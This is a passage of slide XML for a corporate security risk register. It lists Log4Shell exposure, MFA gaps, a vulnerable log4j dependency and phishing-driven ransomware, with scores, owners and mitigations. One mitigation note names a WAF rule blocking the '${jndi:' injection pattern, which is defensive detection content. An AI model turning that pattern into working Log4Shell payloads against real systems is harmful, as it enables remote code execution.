              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MITIGATION SUMMARY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Rectangle 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3566160"/>
            <a:ext cx="1207007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2608" y="3602736"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R-001</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="3602736"/>
            <a:ext cx="2560320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Log4Shell (CVE-2021-44228) unpatched on live ERP server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="TextBox 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584448" y="3602736"/>
            <a:ext cx="1097280" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vulnerability</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="TextBox 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="3602736"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5596128" y="3602736"/>
            <a:ext cx="566928" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="3602736"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>25</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="TextBox 52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848856" y="3602736"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OPEN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7808976" y="3602736"/>
            <a:ext cx="713232" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sec-team</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8613648" y="3602736"/>
            <a:ext cx="3657599" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Upgrade log4j-core ≥2.17.1. WAF rule blocking ${jndi: patterns.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Rectangle 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3813048"/>
            <a:ext cx="1207007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92608" y="3849624"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R-002</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="TextBox 57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="3849624"/>
            <a:ext cx="2560320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MFA coverage at 78% for admin accounts (target: 100%)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="TextBox 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584448" y="3849624"/>
            <a:ext cx="1097280" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Identity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="TextBox 59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="3849624"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="TextBox 60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5596128" y="3849624"/>
            <a:ext cx="566928" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="3849624"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>15</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="TextBox 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848856" y="3849624"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IN PROGRESS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="TextBox 63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7808976" y="3849624"/>
            <a:ext cx="713232" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>iam-team</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="TextBox 64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8613648" y="3849624"/>
            <a:ext cx="3657599" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phased MFA rollout. Q2 target. Conditional access policy in place.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="Rectangle 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4059936"/>
            <a:ext cx="1207007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92608" y="4096512"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R-003</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="TextBox 67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="4096512"/>
            <a:ext cx="2560320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Third-party dep with known RCE (log4j-core &lt; 2.17)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="TextBox 68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584448" y="4096512"/>
            <a:ext cx="1097280" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Supply Chain</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="4096512"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5596128" y="4096512"/>
            <a:ext cx="566928" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="TextBox 71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="4096512"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="TextBox 72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848856" y="4096512"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OPEN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="TextBox 73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7808976" y="4096512"/>
            <a:ext cx="713232" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dev-team</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8613648" y="4096512"/>
            <a:ext cx="3657599" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SCA scanner in CI. Block merge on critical. 3 repos still open.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Rectangle 75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4306824"/>
            <a:ext cx="1207007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92608" y="4343400"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R-005</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="TextBox 77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="4343400"/>
            <a:ext cx="2560320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ransomware via phishing targeting finance department</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584448" y="4343400"/>
            <a:ext cx="1097280" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Human Factor</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="4343400"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="TextBox 80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5596128" y="4343400"/>
            <a:ext cx="566928" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="TextBox 81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="4343400"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="TextBox 82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848856" y="4343400"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IN PROGRESS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="TextBox 83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7808976" y="4343400"/>
            <a:ext cx="713232" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
